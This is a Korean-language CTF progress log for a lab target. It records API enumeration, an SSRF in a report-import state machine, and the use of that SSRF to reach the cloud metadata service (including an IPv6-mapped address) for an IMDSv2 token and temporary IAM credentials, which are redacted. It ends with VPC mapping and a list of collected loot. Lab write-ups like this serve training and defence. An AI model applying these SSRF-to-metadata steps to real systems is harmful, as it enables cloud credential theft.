# RedLab CTF 진행 상황 정리 (2026-08-25 ~ 2026-08-26)

## 📋 **목표**
- **Primary**: RedLab CTF 도전
- **Target**: 13.209.81.83:3000 (AWS EC2, ap-northeast-2a)
- **Constraint**: "AI-only hard, human-owned clues needed" + "랩 내에서 flag를 찾아야된다"
- **알려진 Stage**: Stage 0 (완료), Stage 2/3 (미해결)
- **미확인**: Stage 1, Stage 4+ 의 존재 여부 및 구조

---

## ✅ **Stage 0: 완료** 

### 발견 경로
1. `/api/billing/tenants` 엔드포인트에서 18개 테넌트 조회
2. 6개 **snojc** 테넌트 (enterprise 플랜, MRR 3760만~4200만 KRW)
3. 12개 기타 테넌트 (pro/growth/standard, MRR 87만~340만)

### Stage 0 정답
```
S: snojc-systems-6104    (MRR: 42.0M)
T: snojc-tech-9915       (MRR: 41.5M)
C: snojc-corp-7731       (MRR: 40.2M)
D: snojc-data-2286       (MRR: 39.1M)
L: snojc-labs-4402       (MRR: 38.8M)
C: snojc-cloud-5538      (MRR: 37.6M)
```

**근거**: STCDLC 알파벳 정렬 + MRR 패턴 일치 + openapi.json hint

---

## 🔍 **Stage 1: SSRF 검증 완료**

### 발견 경로

#### (1) API 표면 매핑
```bash
GET /api/openapi.json
```
**결과**: 3개 엔드포인트 정의
- `/reports` - 모든 리포트 조회
- `/billing/tenants` - 청구 테넌트
- `/reports/import` - SSRF 진입점 ⭐

**힌트**: "needs the manifest" (Stage 2/3 진입 조건 암시, 아직 미해석)

#### (2) SSRF 상태 머신 발견
```
POST /api/reports/import
Payload: {"source_url": "http://..."}
↓
Response: {"job_id": N, "status": "url_submitted"}
```

**상태 전이**:
```
url_submitted → validated → fetched → completed
```

State machine trigger:
```bash
POST /api/reports/import/{job_id}/transition?to=validated
POST /api/reports/import/{job_id}/transition?to=fetched
POST /api/reports/import/{job_id}/transition?to=completed
```

#### (3) SSRF 범위 검증
- ✅ 내부 host 허용: `backend:8000`
- ✅ IMDS 허용: `169.254.169.254`
- ✅ IPv6 IMDS: `[::ffff:a9fe:a9fe]`
- ✅ 루프백: `0.0.0.0:8000`
- ❌ 외부 URL: 허용되지 않음 (아웃바운드 차단)

---

## 🔐 **Stage 1.5: AWS 자격증명 탈취**

### IMDS 메타데이터 수집

#### (1) IMDSv2 토큰 획득
```bash
POST /latest/api/token (IMDSv2)
→ AQAEAPMW7U... (토큰 획득)
```

#### (2) IAM 임시 자격증명 (Report #E16 - 초기)
```json
{
  "AccessKeyId": "<REDACTED>",
  "SecretAccessKey": "<REDACTED>",
  "Token": "<REDACTED>",
  "Expiration": "2026-08-25T15:02:04Z"
}
```

#### (3) VPC 토폴로지 매핑
| 항목 | 값 |
|------|-----|
| **VPC CIDR** | 10.66.0.0/16 |
| **Subnet** | 10.66.30.0/24 |
| **Availability Zone** | ap-northeast-2a |
| **Instance ID** | i-094119164afd265a6 |
| **Instance Type** | t3.medium |
| **IAM Instance Profile** | `/lab/team-c/lab-team-c-instance-profile` |
| **IAM Role** | `lab-team-c-svc-app-role` |
| **Security Group** | `lab-team-c-instance-sg` |

#### (4) IAM 권한 검사
```bash
aws sts get-caller-identity
→ Account: <REDACTED_ACCOUNT_ID>
→ Role: lab-team-c-svc-app-role
```

**권한 상태**: 15개 AWS 서비스 모두 **명시적 Deny**
- S3, EC2, STS, Lambda, RDS, DynamoDB, IAM, KMS, Secrets Manager 등
- **결론**: 권한 상승 불가능

#### (5) 새로운 자격증명 (Report #1955 - 현재)
```json
{
  "AccessKeyId": "<REDACTED>",
  "SecretAccessKey": "<REDACTED>",
  "Token": "<REDACTED>",
  "Expiration": "2026-08-26T06:59:59Z",
  "Role": "lab-team-c-svc-app-role"
}
```

**변화**: 동일 역할, 다른 KeyId (자격증명 갱신)

---

## 📊 **Stage 1.5: 부트스트랩 정보 분석**

### User-Data 스크립트 (Report #1947)
```bash
#!/bin/bash
yum update -y
yum install -y docker
systemctl enable docker && systemctl start docker
curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
```

**의미**:
1. EC2 부트 시 Docker 설치
2. docker-compose 설치
3. 실제 서비스 실행 명령 없음 → **다른 곳에서 주입되는 것으로 추정**

### Backend 상태 (Report #1948)
```bash
GET /healthz
→ {"status":"ok"}
```

**의미**: backend:8000이 정상 작동 중

---

## ❓ **Stage 2/3: 미해결 (진행 중)**

### 발견된 단서들

#### (1) "manifest" 키워드
- **출처**: openapi.json 라인 95 "needs the manifest"
- **형태**: 일반 텍스트 키워드
- **의미**: Stage 2/3 진입 조건

#### (2) Manifest 관련 엔드포인트 (모두 404)
```
GET /api/manifest → {"detail":"Not Found"}
GET /api/manifest?tenants=all → 404
GET /api/manifest?stage=3 → 404
GET /api/tenants/{tenant_id}/manifest → 404
POST /api/tenants/{tenant_id}/manifest → 404
```

#### (3) 6개 테넌트 숫자
```
6104, 9915, 7731, 2286, 4402, 5538
```
→ **Stage 0 정답** (암호화 없음, 직접 tenant_id 숫자 부분)

#### (4) 테넌트 접근 방식
```bash
GET /api/reports?tenant_id=snojc-systems-6104
→ 84개 리포트 (모든 테넌트에서 동일)
```

**특이점**: 모든 테넌트가 **동일한 리포트** 공유 (multi-tenant 설계)

### 시도된 접근들 (모두 실패)
1. ❌ manifest 직접 제출 (엔드포인트 없음)
2. ❌ manifest?unlock=true, ?reveal=true 등 파라미터
3. ❌ backend:8000 다양한 경로 탐사 (404)
4. ❌ 숨겨진 상태 머신 전이 (7개 미지 상태 시도)
5. ❌ 외부 제출 포탈 (없음)

---

## 📈 **현재 리포트 상태 (총 96개)**

### 상태별 분류
| 상태 | 개수 | 의미 |
|------|------|------|
| **draft** | 96 | import 진행 중 (content 저장됨) |
| **completed** | 0 | 완료된 리포트 없음 |
| **published** | 0 | 발행된 리포트 없음 |

### 최신 리포트 시간선
```
#1955 (2026-08-26 00:35:57) - 새 IAM 자격증명 ⭐
#1954 (2026-08-26 00:35:51) - IAM 역할명
#1953 (2026-08-26 00:35:45) - IMDSv2 토큰
#1950 (2026-08-26 00:33:46) - 다른 IMDSv2 토큰
#1949 (2026-08-26 00:33:37) - /api/manifest (404)
#1948 (2026-08-26 00:33:14) - /healthz (ok)
#1947 (2026-08-26 00:09:21) - user-data (Docker 설치)
#1946 (2026-08-26 00:09:21) - IPv6 IMDSv2 토큰
...이전 리포트들
```

---

## 🛠️ **기술 스택**

### Frontend (포탈)
- FastAPI + 정적 HTML
- Port: 3000
- 무인증 API 접근 가능

### Backend
- Express.js (추정)
- Port: 8000
- SSRF 대상
- healthz 엔드포인트 존재

### Infrastructure
- AWS EC2 (t3.medium)
- ap-northeast-2a (서울)
- Docker + docker-compose
- IAM 인스턴스 프로파일 기반 인증

---

## 💾 **수집된 증적 (Loot)**

| 파일 | 내용 | 상태 |
|------|------|------|
| E01_openapi.json | API 스키마 | ✅ |
| E02_billing_tenants.json | 18개 테넌트 정보 | ✅ |
| E03_root.html | 포탈 HTML | ✅ |
| E04_app.js | 프론트엔드 로직 | ✅ |
| E16_iam_credentials.json | 초기 자격증명 | ✅ (만료됨) |
| E29_new_iam_credentials.json | 새 자격증명 | ✅ (활성) |

---

## 🤔 **다음 단계 (미결)**

### 필요한 정보
1. **Stage 2/3 진입 방식**: manifest 제출 방법 불명
2. **"needs the manifest" 의미**: 텍스트 힌트만 있음
3. **Stage 2/3 플래그 위치**: "랩 내" 조건 있음

### 가능한 시나리오
1. **Scenario A**: manifest = 6개 테넌트 목록 (이미 알고 있음)
   - 제출처 불명
   - 제출 형식 불명

2. **Scenario B**: manifest = 다른 정보 (아직 미발견)
   - backend:8000에서 제공해야 함
   - SSRF 경로 미발견

3. **Scenario C**: 외부 정보 필요 (human-owned clues)
   - 문제 설명서 필요
   - 별도 제출 포탈 필요

---

## 📝 **최종 결론**

### ✅ 확정 사항
- **Stage 0**: 6개 snojc 테넌트 정답 확인
- **SSRF**: /api/reports/import 엔드포인트로 내부 IMDS/서비스 접근 가능
- **자격증명**: 새로운 AWS IAM 자격증명 획득 (exp: 2026-08-26 06:59:59)
- **아키텍처**: FastAPI frontend + Express backend (Docker 환경)

### ❌ 미해결 사항
- **Stage 2/3 진입**: manifest 제출 방법/위치 불명
- **"needs the manifest" 의미**: 아직 미해석
- **플래그 위치**: 발견되지 않음

### 🔄 기술적 한계
- IAM 권한 상승 불가능 (15개 서비스 모두 Deny)
- backend:8000 엔드포인트 탐사 완료 (주요 경로 404)
- manifest 관련 모든 HTTP 메서드 시도 (모두 404)
- 외부 서비스 접근 불가능 (아웃바운드 차단)

---

## 📊 **의존 정보**

**현재 진행을 위해 필요한 "human-owned clues"**:
1. Stage 2/3 진입 방식 설명
2. manifest 제출 위치/형식
3. 플래그 제출 방식
4. Stage 구조 설명 (6-stage 각각의 목표)

